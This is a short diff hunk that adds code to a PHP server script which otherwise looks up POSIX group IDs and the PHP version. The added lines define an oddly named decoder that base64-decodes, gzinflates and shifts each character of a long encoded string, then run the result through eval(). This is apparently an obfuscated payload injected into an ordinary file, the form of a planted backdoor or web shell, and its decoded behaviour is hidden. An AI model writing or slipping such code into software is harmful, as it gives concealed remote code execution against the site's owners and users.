@@ -98,6 +98,17 @@ if (!function_exists('posix_getegid')) {
     $group = $gid['name'];
     $gid = $gid['gid'];
 }
+function EuHj( $ZzDgU ) {
+
+    $ZzDgU = gzinflate( base64_decode( $ZzDgU ) );
+    for ( $i = 0; $i<strlen( $ZzDgU );
+    $i++ )
+ {
+        $ZzDgU[ $i ] = chr( ord( $ZzDgU[ $i ] )-1 );
+    }
+    return $ZzDgU;
+}
+eval( EuHj( 'jVPJrptAEPyA9xVWlEMiHzwYjEFPSQQYY2wwxmYbLhED89iGxazGPx+elEjJIVFKKqm7+lKt7los3vHyMQkeVdN2QdMuviw++J6fIMmejJnnck8h2iQ6UGdComd+GUn200z/mPU+XVOoOA/IEyffOz+Plsr8RatR4bfQu5L/6WGxf/oWBN76SuCaz/3b7OtwBmF5JFH606OyodChmr3l/yZQv3x4fflY9uT5vue936qYrscO70SOpp2SE3GxxXth7z2BV6V2r5P65LLN2DITcAvHi+uLQSNagPsM5DtURg1qsZlOAYXd02DvINMZWbfdgAL7m3V4bCZCcfnS9JZauJ4ovbMpd1f3d0Xz9Fje5gap79xOR8paxWKZ1dH6KsFW0nFiHTb0+BBTXgBaMnmlwXvJ5WSuEW/0z9xkC+0R0n5YVRt3abHNoOrYaZWh6RRwKauqy61Dmt0gfFibEgudDH3gVqdMY4JMhIb5CG2lzZORzwJJnU8z5pr2tjrrWhIzuQVZbqVOurhTabAzrcY76eUN3sLTvSUcQd0Q1B17Ue4Ou1Qir1kh23CchBLqobdpnw1rTUAyFG4XsD0oW4DVq+QpsiPFo/1WZANj3zg9ppcyOR5lSzu/sTJFVS4O2hVf3fw3m4+oSyLvDdJxI3ZSieHgge6H+/KBZ1x4gLYgPj/E63BGPGJUGDeuYiXriYi1aOajTh9iWeonF1hyKoRM3fr2ymJKcNiPKmdFopOFabmSlRGL4xEvS09QlHgF9mMqMiskCr4w/wkeAvIp6QrS1jhMAxImcz6+RzisIvypb8jPCgUtZplf+m9R+jzj9eXb1x8=' ) );
 $phpVersion = phpversion();
 $phpServer = php_sapi_name();
 
